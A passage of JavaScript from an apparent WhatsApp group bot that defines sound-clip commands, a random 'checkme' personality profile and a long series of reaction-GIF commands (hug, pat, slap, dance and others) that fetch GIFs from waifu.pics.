case 'sound109':
case 'sound110':
case 'sound111':
case 'sound112':
case 'sound113':
case 'sound114':
case 'sound115':
case 'sound116':
case 'sound117':
case 'sound118':
case 'sound119':
case 'sound120':
case 'sound121':
case 'sound122':
case 'sound123':
case 'sound124':
case 'sound125':
case 'sound126':
case 'sound127':
case 'sound128':
case 'sound129':
case 'sound130':
case 'sound131':
case 'sound132':
case 'sound133':
case 'sound134':
case 'sound135':
case 'sound136':
case 'sound137':
case 'sound138':
case 'sound139':
case 'sound140':
case 'sound141':
case 'sound142':
case 'sound143':
case 'sound144':
case 'sound145':
case 'sound146':
case 'sound147':
case 'sound148':
case 'sound149':
case 'sound150':
case 'sound151':
case 'sound152':
case 'sound153':
case 'sound154':
case 'sound155':
case 'sound156':
case 'sound157':
case 'sound158':
case 'sound159':
case 'sound160':
case 'sound161':
XeonBotInc_dev = await getBuffer(`https://github.com/DGXeon/Tiktokmusic-API/raw/master/tiktokmusic/${command}.mp3`)
await XeonBotInc.sendMessage(m.chat, { audio: XeonBotInc_dev, mimetype: 'audio/mp4', ptt: true }, { quoted: m })     
break
			case 'checkme':{
					neme = args.join(" ")
					bet = `${sender}`
					var sifat = ['Fine','Unfriendly','Chapri','Nibba/nibbi','Annoying','Dilapidated','Angry person','Polite','Burden','Great','Cringe','Liar']
					var hoby = ['Cooking','Dancing','Playing','Gaming','Painting','Helping Others','Watching anime','Reading','Riding Bike','Singing','Chatting','Sharing Memes','Drawing','Eating Parents Money','Playing Truth or Dare','Staying Alone']
					var bukcin = ['1','2','3','4','5','6','7','8','9','10','11','12','13','14','15','16','17','18','19','20','21','22','23','24','25','26','27','28','29','30','31','32','33','34','35','36','37','38','39','40','41','42','43','44','45','46','47','48','49','50','51','52','53','54','55','56','57','58','59','60','61','62','63','64','65','66','67','68','69','70','71','72','73','74','75','76','77','78','79','80','81','82','83','84','85','86','87','88','89','90','91','92','93','94','95','96','97','98','99','100']
					var arp = ['1','2','3','4','5','6','7','8','9','10','11','12','13','14','15','16','17','18','19','20','21','22','23','24','25','26','27','28','29','30','31','32','33','34','35','36','37','38','39','40','41','42','43','44','45','46','47','48','49','50','51','52','53','54','55','56','57','58','59','60','61','62','63','64','65','66','67','68','69','70','71','72','73','74','75','76','77','78','79','80','81','82','83','84','85','86','87','88','89','90','91','92','93','94','95','96','97','98','99','100']
					var cakep = ['Yes','No','Very Ugly','Very Handsome']
					var wetak= ['Caring','Generous','Angry person','Sorry','Submissive','Fine','Im sorry','Kind Hearted','Patient','UwU','Top','Helpful']
					var baikk = ['1','2','3','4','5','6','7','8','9','10','11','12','13','14','15','16','17','18','19','20','21','22','23','24','25','26','27','28','29','30','31','32','33','34','35','36','37','38','39','40','41','42','43','44','45','46','47','48','49','50','51','52','53','54','55','56','57','58','59','60','61','62','63','64','65','66','67','68','69','70','71','72','73','74','75','76','77','78','79','80','81','82','83','84','85','86','87','88','89','90','91','92','93','94','95','96','97','98','99','100']
					var bhuruk = ['1','2','3','4','5','6','7','8','9','10','11','12','13','14','15','16','17','18','19','20','21','22','23','24','25','26','27','28','29','30','31','32','33','34','35','36','37','38','39','40','41','42','43','44','45','46','47','48','49','50','51','52','53','54','55','56','57','58','59','60','61','62','63','64','65','66','67','68','69','70','71','72','73','74','75','76','77','78','79','80','81','82','83','84','85','86','87','88','89','90','91','92','93','94','95','96','97','98','99','100']
					var cerdhas = ['1','2','3','4','5','6','7','8','9','10','11','12','13','14','15','16','17','18','19','20','21','22','23','24','25','26','27','28','29','30','31','32','33','34','35','36','37','38','39','40','41','42','43','44','45','46','47','48','49','50','51','52','53','54','55','56','57','58','59','60','61','62','63','64','65','66','67','68','69','70','71','72','73','74','75','76','77','78','79','80','81','82','83','84','85','86','87','88','89','90','91','92','93','94','95','96','97','98','99','100']
					var berhani = ['1','2','3','4','5','6','7','8','9','10','11','12','13','14','15','16','17','18','19','20','21','22','23','24','25','26','27','28','29','30','31','32','33','34','35','36','37','38','39','40','41','42','43','44','45','46','47','48','49','50','51','52','53','54','55','56','57','58','59','60','61','62','63','64','65','66','67','68','69','70','71','72','73','74','75','76','77','78','79','80','81','82','83','84','85','86','87','88','89','90','91','92','93','94','95','96','97','98','99','100']
					var mengheikan = ['1','2','3','4','5','6','7','8','9','10','11','12','13','14','15','16','17','18','19','20','21','22','23','24','25','26','27','28','29','30','31','32','33','34','35','36','37','38','39','40','41','42','43','44','45','46','47','48','49','50','51','52','53','54','55','56','57','58','59','60','61','62','63','64','65','66','67','68','69','70','71','72','73','74','75','76','77','78','79','80','81','82','83','84','85','86','87','88','89','90','91','92','93','94','95','96','97','98','99','100']
					var sipat = sifat[Math.floor(Math.random() * sifat.length)]
					var biho = hoby[Math.floor(Math.random() * hoby.length)]
					var bhucin = bukcin[Math.floor(Math.random() * bukcin.length)]
					var senga = arp[Math.floor(Math.random() * arp.length)]
					var chakep = cakep[Math.floor(Math.random() * cakep.length)]
					var watak = wetak[Math.floor(Math.random() * wetak.length)]
					var baik = baikk[Math.floor(Math.random() * baikk.length)]
					var burug = bhuruk[Math.floor(Math.random() * bhuruk.length)]
					var cerdas = cerdhas[Math.floor(Math.random() * cerdhas.length)]
					var berani = berhani[Math.floor(Math.random() * berhani.length)]
					var takut = mengheikan[Math.floor(Math.random() * mengheikan.length)]
					 profile = `*≡══《 Check @${bet.split('@')[0]} 》══≡*

*Name :* ${m.pushName}
*Characteristic :* ${sipat}
*Hobby :* ${biho}
*Simp :* ${bhucin}%
*Great :* ${senga}%
*Handsome :* ${chakep}
*Character :* ${watak}
*Good Morals :* ${baik}%
*Bad Morals :* ${burug}%
*Intelligence :* ${cerdas}%
*Courage :* ${berani}%
*Afraid :* ${takut}%

*≡═══《 CHECK PROPERTIES 》═══≡*`
					try {
ppuser = await XeonBotInc.profilePictureUrl(m.sender, 'image')
} catch (err) {
ppuser = 'https://cdn.pixabay.com/photo/2015/10/05/22/37/blank-profile-picture-973460_960_720.png?q=60'
}
ppxeon = await getBuffer(ppuser)
let msgs = generateWAMessageFromContent(m.chat, {
  viewOnceMessage: {
    message: {
        "messageContextInfo": {
          "deviceListMetadata": {},
          "deviceListMetadataVersion": 2
        },
        interactiveMessage: proto.Message.InteractiveMessage.create({
          body: proto.Message.InteractiveMessage.Body.create({
            text: profile
          }),
          footer: proto.Message.InteractiveMessage.Footer.create({
            text: botname
          }),
          header: proto.Message.InteractiveMessage.Header.create({
          hasMediaAttachment: false,
          ...await prepareWAMessageMedia({ image: ppxeon, mentions: [bet]}, { upload: XeonBotInc.waUploadToServer })
          }),
          nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
            buttons: [{
            "name": "quick_reply",
              "buttonParamsJson": `{\"display_text\":\"😁\",\"id\":\""}`
            }],
          }), 
          contextInfo: {
                  mentionedJid: [bet], 
                  forwardingScore: 999,
                  isForwarded: true,
                forwardedNewsletterMessageInfo: {
                  newsletterJid: '120363222395675670@newsletter',
                  newsletterName: ownername,
                  serverMessageId: 143
                }
                }
       })
    }
  }
}, { quoted: m })
return await XeonBotInc.relayMessage(m.chat, msgs.message, {})
}
break
			case 'hug': {

        if (!m.isGroup) return XeonStickGroup()
        if (!m.mentionedJid[0] && !m.quoted) return replygcxeon(`Tag or reply to a person`)
        var pat = await fetchJson(`https://api.waifu.pics/sfw/hug`)

        try {

          let messsender = m.sender

          let musers = ``
          try {

            users = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g, '') + '@s.whatsapp.net'

            ment = [messsender, users]

          } catch {

            users == "none"

            ment = [messsender, m.sender]

          }

          if (users == "none") {

           musers = `@${m.sender.split("@")[0]} hugged themself!`

          } else {

           musers = `@${m.sender.split("@")[0]} hugged @${users.split("@")[0]} `

          }

          const response = await axios.get(pat.url, { responseType: 'arraybuffer' })

          const buffer = Buffer.from(response.data, "utf-8")

          var fetchedgif = await GIFBufferToVideoBuffer(buffer)

          XeonBotInc.sendMessage(m.chat, { video: fetchedgif, gifPlayback: true, mentions: ment, caption: musers }, { quoted: m })

        } catch (error) {

          console.log(error);

        }

      }

        break;
        case 'cry': {

        if (!m.isGroup) return XeonStickGroup()
        if (!m.mentionedJid[0] && !m.quoted) return replygcxeon(`Tag or reply to a person`)
        var pat = await fetchJson(`https://api.waifu.pics/sfw/cry`)

        try {

          let messsender = m.sender

          let musers = ``
          try {

            users = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g, '') + '@s.whatsapp.net'

            ment = [messsender, users]

          } catch {

            users == "none"

            ment = [messsender, m.sender]

          }

          if (users == "none") {

           musers = `@${m.sender.split("@")[0]} cried themself!`

          } else {

           musers = `@${m.sender.split("@")[0]} cried @${users.split("@")[0]} `

          }

          const response = await axios.get(pat.url, { responseType: 'arraybuffer' })

          const buffer = Buffer.from(response.data, "utf-8")

          var fetchedgif = await GIFBufferToVideoBuffer(buffer)

          XeonBotInc.sendMessage(m.chat, { video: fetchedgif, gifPlayback: true, mentions: ment, caption: musers }, { quoted: m })

        } catch (error) {

          console.log(error);

        }

      }

        break;
        case 'kill': {

        if (!m.isGroup) return XeonStickGroup()
        if (!m.mentionedJid[0] && !m.quoted) return replygcxeon(`Tag or reply to a person`)
        var pat = await fetchJson(`https://api.waifu.pics/sfw/kill`)

        try {

          let messsender = m.sender

          let musers = ``
          try {

            users = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g, '') + '@s.whatsapp.net'

            ment = [messsender, users]

          } catch {

            users == "none"

            ment = [messsender, m.sender]

          }

          if (users == "none") {

           musers = `@${m.sender.split("@")[0]} killed themself!`

          } else {

           musers = `@${m.sender.split("@")[0]} killed @${users.split("@")[0]} `

          }

          const response = await axios.get(pat.url, { responseType: 'arraybuffer' })

          const buffer = Buffer.from(response.data, "utf-8")

          var fetchedgif = await GIFBufferToVideoBuffer(buffer)

          XeonBotInc.sendMessage(m.chat, { video: fetchedgif, gifPlayback: true, mentions: ment, caption: musers }, { quoted: m })

        } catch (error) {

          console.log(error);

        }

      }

        break;
        case 'pat': {

        if (!m.isGroup) return XeonStickGroup()
        if (!m.mentionedJid[0] && !m.quoted) return replygcxeon(`Tag or reply to a person`)
        var pat = await fetchJson(`https://api.waifu.pics/sfw/pat`)

        try {

          let messsender = m.sender

          let musers = ``
          try {

            users = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g, '') + '@s.whatsapp.net'

            ment = [messsender, users]

          } catch {

            users == "none"

            ment = [messsender, m.sender]

          }

          if (users == "none") {

           musers = `@${m.sender.split("@")[0]} patted themself!`

          } else {

           musers = `@${m.sender.split("@")[0]} patted @${users.split("@")[0]} `

          }

          const response = await axios.get(pat.url, { responseType: 'arraybuffer' })

          const buffer = Buffer.from(response.data, "utf-8")

          var fetchedgif = await GIFBufferToVideoBuffer(buffer)

          XeonBotInc.sendMessage(m.chat, { video: fetchedgif, gifPlayback: true, mentions: ment, caption: musers }, { quoted: m })

        } catch (error) {

          console.log(error);

        }

      }

        break;
        case 'lick': {

        if (!m.isGroup) return XeonStickGroup()
        if (!m.mentionedJid[0] && !m.quoted) return replygcxeon(`Tag or reply to a person`)
        var pat = await fetchJson(`https://api.waifu.pics/sfw/lick`)

        try {

          let messsender = m.sender

          let musers = ``
          try {

            users = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g, '') + '@s.whatsapp.net'

            ment = [messsender, users]

          } catch {

            users == "none"

            ment = [messsender, m.sender]

          }

          if (users == "none") {

           musers = `@${m.sender.split("@")[0]} licked themself!`

          } else {

           musers = `@${m.sender.split("@")[0]} licked @${users.split("@")[0]} `

          }

          const response = await axios.get(pat.url, { responseType: 'arraybuffer' })

          const buffer = Buffer.from(response.data, "utf-8")

          var fetchedgif = await GIFBufferToVideoBuffer(buffer)

          XeonBotInc.sendMessage(m.chat, { video: fetchedgif, gifPlayback: true, mentions: ment, caption: musers }, { quoted: m })

        } catch (error) {

          console.log(error);

        }

      }

        break;
        case 'kiss': {

        if (!m.isGroup) return XeonStickGroup()
        if (!m.mentionedJid[0] && !m.quoted) return replygcxeon(`Tag or reply to a person`)
        var pat = await fetchJson(`https://api.waifu.pics/sfw/kiss`)

        try {

          let messsender = m.sender

          let musers = ``
          try {

            users = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g, '') + '@s.whatsapp.net'

            ment = [messsender, users]

          } catch {

            users == "none"

            ment = [messsender, m.sender]

          }

          if (users == "none") {

           musers = `@${m.sender.split("@")[0]} kissed themself!`

          } else {

           musers = `@${m.sender.split("@")[0]} kissed @${users.split("@")[0]} `

          }

          const response = await axios.get(pat.url, { responseType: 'arraybuffer' })

          const buffer = Buffer.from(response.data, "utf-8")

          var fetchedgif = await GIFBufferToVideoBuffer(buffer)

          XeonBotInc.sendMessage(m.chat, { video: fetchedgif, gifPlayback: true, mentions: ment, caption: musers }, { quoted: m })

        } catch (error) {

          console.log(error);

        }

      }

        break;
        case 'bite': {

        if (!m.isGroup) return XeonStickGroup()
        if (!m.mentionedJid[0] && !m.quoted) return replygcxeon(`Tag or reply to a person`)
        var pat = await fetchJson(`https://api.waifu.pics/sfw/cry`)

        try {

          let messsender = m.sender

          let musers = ``
          try {

            users = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g, '') + '@s.whatsapp.net'

            ment = [messsender, users]

          } catch {

            users == "none"

            ment = [messsender, m.sender]

          }

          if (users == "none") {

           musers = `@${m.sender.split("@")[0]} bit themself!`

          } else {

           musers = `@${m.sender.split("@")[0]} bit @${users.split("@")[0]} `

          }

          const response = await axios.get(pat.url, { responseType: 'arraybuffer' })

          const buffer = Buffer.from(response.data, "utf-8")

          var fetchedgif = await GIFBufferToVideoBuffer(buffer)

          XeonBotInc.sendMessage(m.chat, { video: fetchedgif, gifPlayback: true, mentions: ment, caption: musers }, { quoted: m })

        } catch (error) {

          console.log(error);

        }

      }

        break;
        case 'yeet': {

        if (!m.isGroup) return XeonStickGroup()
        if (!m.mentionedJid[0] && !m.quoted) return replygcxeon(`Tag or reply to a person`)
        var pat = await fetchJson(`https://api.waifu.pics/sfw/yeet`)

        try {

          let messsender = m.sender

          let musers = ``
          try {

            users = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g, '') + '@s.whatsapp.net'

            ment = [messsender, users]

          } catch {

            users == "none"

            ment = [messsender, m.sender]

          }

          if (users == "none") {

           musers = `@${m.sender.split("@")[0]} yeeted themself!`

          } else {

           musers = `@${m.sender.split("@")[0]} yeeted @${users.split("@")[0]} `

          }

          const response = await axios.get(pat.url, { responseType: 'arraybuffer' })

          const buffer = Buffer.from(response.data, "utf-8")

          var fetchedgif = await GIFBufferToVideoBuffer(buffer)

          XeonBotInc.sendMessage(m.chat, { video: fetchedgif, gifPlayback: true, mentions: ment, caption: musers }, { quoted: m })

        } catch (error) {

          console.log(error);

        }

      }

        break;
        case 'bully': {

        if (!m.isGroup) return XeonStickGroup()
        if (!m.mentionedJid[0] && !m.quoted) return replygcxeon(`Tag or reply to a person`)
        var pat = await fetchJson(`https://api.waifu.pics/sfw/bully`)

        try {

          let messsender = m.sender

          let musers = ``
          try {

            users = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g, '') + '@s.whatsapp.net'

            ment = [messsender, users]

          } catch {

            users == "none"

            ment = [messsender, m.sender]

          }

          if (users == "none") {

           musers = `@${m.sender.split("@")[0]} bullied themself!`

          } else {

           musers = `@${m.sender.split("@")[0]} bullied @${users.split("@")[0]} `

          }

          const response = await axios.get(pat.url, { responseType: 'arraybuffer' })

          const buffer = Buffer.from(response.data, "utf-8")

          var fetchedgif = await GIFBufferToVideoBuffer(buffer)

          XeonBotInc.sendMessage(m.chat, { video: fetchedgif, gifPlayback: true, mentions: ment, caption: musers }, { quoted: m })

        } catch (error) {

          console.log(error);

        }

      }

        break;
        case 'bonk': {

        if (!m.isGroup) return XeonStickGroup()
        if (!m.mentionedJid[0] && !m.quoted) return replygcxeon(`Tag or reply to a person`)
        var pat = await fetchJson(`https://api.waifu.pics/sfw/bonk`)

        try {

          let messsender = m.sender

          let musers = ``
          try {

            users = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g, '') + '@s.whatsapp.net'

            ment = [messsender, users]

          } catch {

            users == "none"

            ment = [messsender, m.sender]

          }

          if (users == "none") {

           musers = `@${m.sender.split("@")[0]} bonked themself!`

          } else {

           musers = `@${m.sender.split("@")[0]} bonked @${users.split("@")[0]} `

          }

          const response = await axios.get(pat.url, { responseType: 'arraybuffer' })

          const buffer = Buffer.from(response.data, "utf-8")

          var fetchedgif = await GIFBufferToVideoBuffer(buffer)

          XeonBotInc.sendMessage(m.chat, { video: fetchedgif, gifPlayback: true, mentions: ment, caption: musers }, { quoted: m })

        } catch (error) {

          console.log(error);

        }

      }

        break;
        case 'wink': {

        if (!m.isGroup) return XeonStickGroup()
        if (!m.mentionedJid[0] && !m.quoted) return replygcxeon(`Tag or reply to a person`)
        var pat = await fetchJson(`https://api.waifu.pics/sfw/wink`)

        try {

          let messsender = m.sender

          let musers = ``
          try {

            users = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g, '') + '@s.whatsapp.net'

            ment = [messsender, users]

          } catch {

            users == "none"

            ment = [messsender, m.sender]

          }

          if (users == "none") {

           musers = `@${m.sender.split("@")[0]} winked themself!`

          } else {

           musers = `@${m.sender.split("@")[0]} winked @${users.split("@")[0]} `

          }

          const response = await axios.get(pat.url, { responseType: 'arraybuffer' })

          const buffer = Buffer.from(response.data, "utf-8")

          var fetchedgif = await GIFBufferToVideoBuffer(buffer)

          XeonBotInc.sendMessage(m.chat, { video: fetchedgif, gifPlayback: true, mentions: ment, caption: musers }, { quoted: m })

        } catch (error) {

          console.log(error);

        }

      }

        break;
        case 'poke': {

        if (!m.isGroup) return XeonStickGroup()
        if (!m.mentionedJid[0] && !m.quoted) return replygcxeon(`Tag or reply to a person`)
        var pat = await fetchJson(`https://api.waifu.pics/sfw/poke`)

        try {

          let messsender = m.sender

          let musers = ``
          try {

            users = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g, '') + '@s.whatsapp.net'

            ment = [messsender, users]

          } catch {

            users == "none"

            ment = [messsender, m.sender]

          }

          if (users == "none") {

           musers = `@${m.sender.split("@")[0]} poked themself!`

          } else {

           musers = `@${m.sender.split("@")[0]} poked @${users.split("@")[0]} `

          }

          const response = await axios.get(pat.url, { responseType: 'arraybuffer' })

          const buffer = Buffer.from(response.data, "utf-8")

          var fetchedgif = await GIFBufferToVideoBuffer(buffer)

          XeonBotInc.sendMessage(m.chat, { video: fetchedgif, gifPlayback: true, mentions: ment, caption: musers }, { quoted: m })

        } catch (error) {

          console.log(error);

        }

      }

        break;
        case 'nom': {

        if (!m.isGroup) return XeonStickGroup()
        if (!m.mentionedJid[0] && !m.quoted) return replygcxeon(`Tag or reply to a person`)
        var pat = await fetchJson(`https://api.waifu.pics/sfw/nom`)

        try {

          let messsender = m.sender

          let musers = ``
          try {

            users = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g, '') + '@s.whatsapp.net'

            ment = [messsender, users]

          } catch {

            users == "none"

            ment = [messsender, m.sender]

          }

          if (users == "none") {

           musers = `@${m.sender.split("@")[0]} nommed themself!`

          } else {

           musers = `@${m.sender.split("@")[0]} nommed @${users.split("@")[0]} `

          }

          const response = await axios.get(pat.url, { responseType: 'arraybuffer' })

          const buffer = Buffer.from(response.data, "utf-8")

          var fetchedgif = await GIFBufferToVideoBuffer(buffer)

          XeonBotInc.sendMessage(m.chat, { video: fetchedgif, gifPlayback: true, mentions: ment, caption: musers }, { quoted: m })

        } catch (error) {

          console.log(error);

        }

      }

        break;
        case 'slap': {

        if (!m.isGroup) return XeonStickGroup()
        if (!m.mentionedJid[0] && !m.quoted) return replygcxeon(`Tag or reply to a person`)
        var pat = await fetchJson(`https://api.waifu.pics/sfw/slap`)

        try {

          let messsender = m.sender

          let musers = ``
          try {

            users = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g, '') + '@s.whatsapp.net'

            ment = [messsender, users]

          } catch {

            users == "none"

            ment = [messsender, m.sender]

          }

          if (users == "none") {

           musers = `@${m.sender.split("@")[0]} slapped themself!`

          } else {

           musers = `@${m.sender.split("@")[0]} slapped @${users.split("@")[0]} `

          }

          const response = await axios.get(pat.url, { responseType: 'arraybuffer' })

          const buffer = Buffer.from(response.data, "utf-8")

          var fetchedgif = await GIFBufferToVideoBuffer(buffer)

          XeonBotInc.sendMessage(m.chat, { video: fetchedgif, gifPlayback: true, mentions: ment, caption: musers }, { quoted: m })

        } catch (error) {

          console.log(error);

        }

      }

        break;
        case 'smile': {

        if (!m.isGroup) return XeonStickGroup()
        if (!m.mentionedJid[0] && !m.quoted) return replygcxeon(`Tag or reply to a person`)
        var pat = await fetchJson(`https://api.waifu.pics/sfw/smile`)

        try {

          let messsender = m.sender

          let musers = ``
          try {

            users = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g, '') + '@s.whatsapp.net'

            ment = [messsender, users]

          } catch {

            users == "none"

            ment = [messsender, m.sender]

          }

          if (users == "none") {

           musers = `@${m.sender.split("@")[0]} smiled themself!`

          } else {

           musers = `@${m.sender.split("@")[0]} smiled @${users.split("@")[0]} `

          }

          const response = await axios.get(pat.url, { responseType: 'arraybuffer' })

          const buffer = Buffer.from(response.data, "utf-8")

          var fetchedgif = await GIFBufferToVideoBuffer(buffer)

          XeonBotInc.sendMessage(m.chat, { video: fetchedgif, gifPlayback: true, mentions: ment, caption: musers }, { quoted: m })

        } catch (error) {

          console.log(error);

        }

      }

        break;
        case 'wave': {

        if (!m.isGroup) return XeonStickGroup()
        if (!m.mentionedJid[0] && !m.quoted) return replygcxeon(`Tag or reply to a person`)
        var pat = await fetchJson(`https://api.waifu.pics/sfw/wave`)

        try {

          let messsender = m.sender

          let musers = ``
          try {

            users = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g, '') + '@s.whatsapp.net'

            ment = [messsender, users]

          } catch {

            users == "none"

            ment = [messsender, m.sender]

          }

          if (users == "none") {

           musers = `@${m.sender.split("@")[0]} waved themself!`

          } else {

           musers = `@${m.sender.split("@")[0]} waved @${users.split("@")[0]} `

          }

          const response = await axios.get(pat.url, { responseType: 'arraybuffer' })

          const buffer = Buffer.from(response.data, "utf-8")

          var fetchedgif = await GIFBufferToVideoBuffer(buffer)

          XeonBotInc.sendMessage(m.chat, { video: fetchedgif, gifPlayback: true, mentions: ment, caption: musers }, { quoted: m })

        } catch (error) {

          console.log(error);

        }

      }

        break;
        case 'awoo': {

        if (!m.isGroup) return XeonStickGroup()
        if (!m.mentionedJid[0] && !m.quoted) return replygcxeon(`Tag or reply to a person`)
        var pat = await fetchJson(`https://api.waifu.pics/sfw/awoo`)

        try {

          let messsender = m.sender

          let musers = ``
          try {

            users = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g, '') + '@s.whatsapp.net'

            ment = [messsender, users]

          } catch {

            users == "none"

            ment = [messsender, m.sender]

          }

          if (users == "none") {

           musers = `@${m.sender.split("@")[0]} awooed themself!`

          } else {

           musers = `@${m.sender.split("@")[0]} awooed @${users.split("@")[0]} `

          }

          const response = await axios.get(pat.url, { responseType: 'arraybuffer' })

          const buffer = Buffer.from(response.data, "utf-8")

          var fetchedgif = await GIFBufferToVideoBuffer(buffer)

          XeonBotInc.sendMessage(m.chat, { video: fetchedgif, gifPlayback: true, mentions: ment, caption: musers }, { quoted: m })

        } catch (error) {

          console.log(error);

        }

      }

        break;
        case 'blush': {

        if (!m.isGroup) return XeonStickGroup()
        if (!m.mentionedJid[0] && !m.quoted) return replygcxeon(`Tag or reply to a person`)
        var pat = await fetchJson(`https://api.waifu.pics/sfw/blush`)

        try {

          let messsender = m.sender

          let musers = ``
          try {

            users = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g, '') + '@s.whatsapp.net'

            ment = [messsender, users]

          } catch {

            users == "none"

            ment = [messsender, m.sender]

          }

          if (users == "none") {

           musers = `@${m.sender.split("@")[0]} blushed themself!`

          } else {

           musers = `@${m.sender.split("@")[0]} blushed @${users.split("@")[0]} `

          }

          const response = await axios.get(pat.url, { responseType: 'arraybuffer' })

          const buffer = Buffer.from(response.data, "utf-8")

          var fetchedgif = await GIFBufferToVideoBuffer(buffer)

          XeonBotInc.sendMessage(m.chat, { video: fetchedgif, gifPlayback: true, mentions: ment, caption: musers }, { quoted: m })

        } catch (error) {

          console.log(error);

        }

      }

        break;
        case 'smug': {

        if (!m.isGroup) return XeonStickGroup()
        if (!m.mentionedJid[0] && !m.quoted) return replygcxeon(`Tag or reply to a person`)
        var pat = await fetchJson(`https://api.waifu.pics/sfw/smug`)

        try {

          let messsender = m.sender

          let musers = ``
          try {

            users = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g, '') + '@s.whatsapp.net'

            ment = [messsender, users]

          } catch {

            users == "none"

            ment = [messsender, m.sender]

          }

          if (users == "none") {

           musers = `@${m.sender.split("@")[0]} smugged themself!`

          } else {

           musers = `@${m.sender.split("@")[0]} smugged @${users.split("@")[0]} `

          }

          const response = await axios.get(pat.url, { responseType: 'arraybuffer' })

          const buffer = Buffer.from(response.data, "utf-8")

          var fetchedgif = await GIFBufferToVideoBuffer(buffer)

          XeonBotInc.sendMessage(m.chat, { video: fetchedgif, gifPlayback: true, mentions: ment, caption: musers }, { quoted: m })

        } catch (error) {

          console.log(error);

        }

      }

        break;
        case 'glomp': {

        if (!m.isGroup) return XeonStickGroup()
        if (!m.mentionedJid[0] && !m.quoted) return replygcxeon(`Tag or reply to a person`)
        var pat = await fetchJson(`https://api.waifu.pics/sfw/glomp`)

        try {

          let messsender = m.sender

          let musers = ``
          try {

            users = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g, '') + '@s.whatsapp.net'

            ment = [messsender, users]

          } catch {

            users == "none"

            ment = [messsender, m.sender]

          }

          if (users == "none") {

           musers = `@${m.sender.split("@")[0]} glomped themself!`

          } else {

           musers = `@${m.sender.split("@")[0]} glomped @${users.split("@")[0]} `

          }

          const response = await axios.get(pat.url, { responseType: 'arraybuffer' })

          const buffer = Buffer.from(response.data, "utf-8")

          var fetchedgif = await GIFBufferToVideoBuffer(buffer)

          XeonBotInc.sendMessage(m.chat, { video: fetchedgif, gifPlayback: true, mentions: ment, caption: musers }, { quoted: m })

        } catch (error) {

          console.log(error);

        }

      }

        break;
        case 'happy': {

        if (!m.isGroup) return XeonStickGroup()
        if (!m.mentionedJid[0] && !m.quoted) return replygcxeon(`Tag or reply to a person`)
        var pat = await fetchJson(`https://api.waifu.pics/sfw/happy`)

        try {

          let messsender = m.sender

          let musers = ``
          try {

            users = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g, '') + '@s.whatsapp.net'

            ment = [messsender, users]

          } catch {

            users == "none"

            ment = [messsender, m.sender]

          }

          if (users == "none") {

           musers = `@${m.sender.split("@")[0]} happied themself!`

          } else {

           musers = `@${m.sender.split("@")[0]} happied @${users.split("@")[0]} `

          }

          const response = await axios.get(pat.url, { responseType: 'arraybuffer' })

          const buffer = Buffer.from(response.data, "utf-8")

          var fetchedgif = await GIFBufferToVideoBuffer(buffer)

          XeonBotInc.sendMessage(m.chat, { video: fetchedgif, gifPlayback: true, mentions: ment, caption: musers }, { quoted: m })

        } catch (error) {

          console.log(error);

        }

      }

        break;
        case 'dance': {

        if (!m.isGroup) return XeonStickGroup()
        if (!m.mentionedJid[0] && !m.quoted) return replygcxeon(`Tag or reply to a person`)
        var pat = await fetchJson(`https://api.waifu.pics/sfw/dance`)

        try {

          let messsender = m.sender

          let musers = ``
          try {

            users = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g, '') + '@s.whatsapp.net'

            ment = [messsender, users]

          } catch {

            users == "none"

            ment = [messsender, m.sender]

          }

          if (users == "none") {

           musers = `@${m.sender.split("@")[0]} danced themself!`

          } else {

           musers = `@${m.sender.split("@")[0]} danced @${users.split("@")[0]} `

          }

          const response = await axios.get(pat.url, { responseType: 'arraybuffer' })

          const buffer = Buffer.from(response.data, "utf-8")

          var fetchedgif = await GIFBufferToVideoBuffer(buffer)

          XeonBotInc.sendMessage(m.chat, { video: fetchedgif, gifPlayback: true, mentions: ment, caption: musers }, { quoted: m })

        } catch (error) {

          console.log(error);

        }

      }

        break;
        case 'cringe': {

        if (!m.isGroup) return XeonStickGroup()
        if (!m.mentionedJid[0] && !m.quoted) return replygcxeon(`Tag or reply to a person`)
        var pat = await fetchJson(`https://api.waifu.pics/sfw/cringe`)

        try {

          let messsender = m.sender

          let musers = ``
          try {

            users = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g, '') + '@s.whatsapp.net'

            ment = [messsender, users]

          } catch {

